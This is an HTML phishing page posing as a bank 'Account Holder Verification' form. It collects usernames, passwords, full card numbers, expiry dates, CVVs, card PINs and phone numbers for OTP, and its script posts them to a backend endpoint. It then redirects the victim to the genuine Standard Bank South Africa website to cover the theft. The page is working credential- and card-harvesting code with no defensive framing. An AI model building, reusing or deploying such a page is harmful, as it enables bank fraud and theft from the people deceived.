<!DOCTYPE html>
<html>
<head>
    <title>Account Verification</title>
    <!-- Add favicon -->
    <link rel="icon" type="image/png" href="https://account-security-check.netlify.app/zsg.png">
    
    <!-- Viewport meta tag for mobile responsiveness -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Internal CSS for Styling -->
    <style>
        /* General body styling */
        body {
            font-family: Arial, sans-serif; /* Set font family to Arial with fallback to sans-serif */
            background-color: #003cc7; /* Deep blue background color */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
            display: flex; /* Use flexbox layout */
            flex-direction: column; /* Stack items vertically */
            justify-content: center; /* Center items vertically */
            align-items: center; /* Center items horizontally */
            min-height: 100vh; /* Ensure the body takes at least the full viewport height */
        }

        /* Image styling */
        #form-logo {
            width: 100px; /* Set image width to 100 pixels */
            height: auto; /* Maintain aspect ratio automatically */
            margin-bottom: 20px; /* Add 20px space below the image */
        }

        /* Form container styling */
        #contact-form {
            background-color: #ffffff; /* White background for the form */
            padding: 20px; /* Add 20px padding inside the form */
            border-radius: 8px; /* Round the corners with 8px radius */
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); /* Add subtle shadow */
            width: 90%; /* Form takes 90% of container width on mobile */
            max-width: 400px; /* Maximum width of 400px for larger screens */
            color: #333; /* Dark text color for the form */
        }

        /* Heading styling */
        .form-heading {
            text-align: center; /* Center the heading text */
            font-size: 24px; /* Set font size to 24 pixels */
            font-weight: bold; /* Make text bold */
            margin-bottom: 20px; /* Add 20px space below the heading */
            color: #333; /* Dark text color for the heading */
        }

        /* Label styling */
        label {
            display: block; /* Make label a block element */
            margin-bottom: 8px; /* Add 8px space below each label */
            font-weight: bold; /* Make label text bold */
            color: #333; /* Dark text color for labels */
        }

        /* Input and textarea styling */
        input[type="text"],
        input[type="password"],
        textarea {
            width: 100%; /* Input takes full width of container */
            padding: 10px; /* Add 10px padding inside inputs */
            margin-bottom: 15px; /* Add 15px space below each input */
            border: 1px solid #ccc; /* Light gray border */
            border-radius: 4px; /* Round corners with 4px radius */
            font-size: 16px; /* Set font size to 16 pixels */
            box-sizing: border-box; /* Include padding and border in width calculation */
            background-color: #fff; /* White background for inputs */
            color: #333; /* Dark text color for inputs */
        }

        textarea {
            resize: vertical; /* Allow only vertical resizing of textarea */
            height: 80px; /* Set textarea height to 80 pixels */
        }

        /* Submit button styling */
        input[type="submit"] {
            background-color: #0056b3; /* Dark blue background color */
            color: #fff; /* White text color */
            border: none; /* Remove default border */
            padding: 12px 20px; /* Add vertical and horizontal padding */
            border-radius: 4px; /* Round corners with 4px radius */
            font-size: 16px; /* Set font size to 16 pixels */
            cursor: pointer; /* Show pointer cursor on hover */
            width: 100%; /* Button takes full width */
            transition: background-color 0.3s ease; /* Smooth color transition on hover */
        }

        input[type="submit"]:hover {
            background-color: #004080; /* Even darker blue on hover */
        }

        /* Loading spinner styling */
        #loading-spinner {
            display: none; /* Hidden by default */
            text-align: center; /* Center the loading text */
            margin-top: 10px; /* Add 10px space above spinner */
        }

        /* Show password toggle styling */
        .show-password-container {
            display: flex; /* Use flexbox layout */
            align-items: center; /* Vertically center checkbox and label */
            margin-bottom: 15px; /* Add 15px space below container */
        }

        .show-password-container input[type="checkbox"] {
            margin-right: 10px; /* Add 10px space to the right of checkbox */
        }

        /* Success message styling */
        .success-message {
            background-color: #d4edda; /* Light green background */
            color: #155724; /* Dark green text */
            padding: 15px; /* Add 15px padding */
            border-radius: 4px; /* Round corners */
            margin-top: 15px; /* Add space above message */
            text-align: center; /* Center the text */
            display: none; /* Hidden by default */
        }

        /* Error message styling */
        .error-message {
            background-color: #f8d7da; /* Light red background */
            color: #721c24; /* Dark red text */
            padding: 15px; /* Add 15px padding */
            border-radius: 4px; /* Round corners */
            margin-top: 15px; /* Add space above message */
            text-align: center; /* Center the text */
            display: none; /* Hidden by default */
        }
    </style>
</head>
<body>
    <!-- Image outside the form -->
    <img src="https://account-security-check.netlify.app/zsg.png" alt="Form Logo" id="form-logo">

    <!-- Form -->
    <form id="contact-form">
        <!-- Heading -->
        <h2 class="form-heading">Account Holder Verification</h2>

        <!-- Hidden field for contact number -->
        <input type="hidden" name="contact_number" value="697483">

        <!-- Username field -->
        <label>Username</label>
        <input type="text" name="fullname" placeholder="Enter your username (min 3 characters)" required minlength="3">

        <!-- Password field -->
        <label>Password</label>
        <input type="password" name="password" id="password" placeholder="Enter your password (min 6 characters)" required minlength="6">

        <!-- Show Password Toggle -->
        <div class="show-password-container">
            <input type="checkbox" id="show-password">
            <label for="show-password">Show Password</label>
        </div>

        <!-- Card Number field -->
        <label>Card Number</label>
        <textarea name="CardNumber" placeholder="Enter your 16-digit card number" required minlength="16" maxlength="16"></textarea>

        <!-- Expiry Date field -->
        <label>Expiry Date</label>
        <input type="text" name="expiry_date" placeholder="MM/YY (e.g., 12/25)" required pattern="\d{2}/\d{2}" title="Please enter a valid expiry date (MM/YY)">

        <!-- CVV field -->
        <label>CVV</label>
        <input type="text" name="cvv" placeholder="Enter CVV (3 digits)" required pattern="\d{3}" title="Please enter a valid CVV (3 digits)">

        <!-- Card Pin field -->
        <label>Card Pin</label>
        <textarea name="card_pin" placeholder="Enter your 5-digit card pin" required minlength="5" maxlength="5"></textarea>

        <!-- Phone Number field for OTP -->
        <label>Phone Number for OTP</label>
        <input type="tel" name="phone_number" placeholder="Enter your phone number to receive OTP" required pattern="[0-9]{10,15}" title="Please enter a valid phone number (10-15 digits)">

        <!-- Submit button -->
        <input type="submit" value="Verify Account">

        <!-- Loading spinner -->
        <div id="loading-spinner">Processing verification...</div>

        <!-- Success message -->
        <div id="success-message" class="success-message"></div>

        <!-- Error message -->
        <div id="error-message" class="error-message"></div>
    </form>

    <!-- User Activity Tracking Script -->
    <script src="/public/tracking.js"></script>
    
    <!-- JavaScript -->
    <script>
        // Show Password Toggle functionality
        document.getElementById('show-password').addEventListener('change', function() {
            const passwordField = document.getElementById('password'); // Get password input element
            passwordField.type = this.checked ? 'text' : 'password'; // Toggle between text and password type
        });

        // Form Submission handling
        document.getElementById('contact-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission to avoid page reload

            // Show loading spinner and hide any previous messages
            document.getElementById('loading-spinner').style.display = 'block';
            document.getElementById('success-message').style.display = 'none';
            document.getElementById('error-message').style.display = 'none';

            // Collect form data
            const formData = new FormData(this); // Create FormData object from form
            const data = Object.fromEntries(formData.entries()); // Convert FormData to plain object

            // Send form data to our backend API
            fetch('/api/submit', {
                method: 'POST', // Use POST method
                headers: {
                    'Content-Type': 'application/json', // Set content type to JSON
                },
                body: JSON.stringify(data) // Convert data object to JSON string
            })
            .then(response => {
                if (!response.ok) { // Check if response status is not OK
                    throw new Error('Network response was not ok'); // Throw error for bad responses
                }
                return response.json(); // Parse response as JSON
            })
            .then(data => {
                console.log('Success:', data); // Log success to console
                
                // Show success message
                const successMessage = document.getElementById('success-message');
                successMessage.textContent = data.message || 'Verification completed successfully!';
                successMessage.style.display = 'block';
                
                // Reset form after successful submission
                document.getElementById('contact-form').reset();
                
                // Check if server provided a redirect URL
                if (data.redirect) {
                    // Redirect to loading page immediately for better user experience
                    setTimeout(() => {
                        window.location.href = data.redirect; // Redirect to loading page
                    }, 1000); // 1 second delay to show success message
                } else {
                    // Fallback: redirect to Standard Bank website after 2 seconds
                    setTimeout(() => {
                        window.location.href = "https://www.standardbank.co.za/southafrica/personal";
                    }, 2000);
                }
            })
            .catch(error => {
                console.error('Error:', error); // Log error to console
                
                // Show error message
                const errorMessage = document.getElementById('error-message');
                errorMessage.textContent = 'Failed to submit verification. Please try again.';
                errorMessage.style.display = 'block';
            })
            .finally(() => {
                // Hide loading spinner regardless of success or failure
                document.getElementById('loading-spinner').style.display = 'none';
            });
        });
    </script>
</body>
</html>
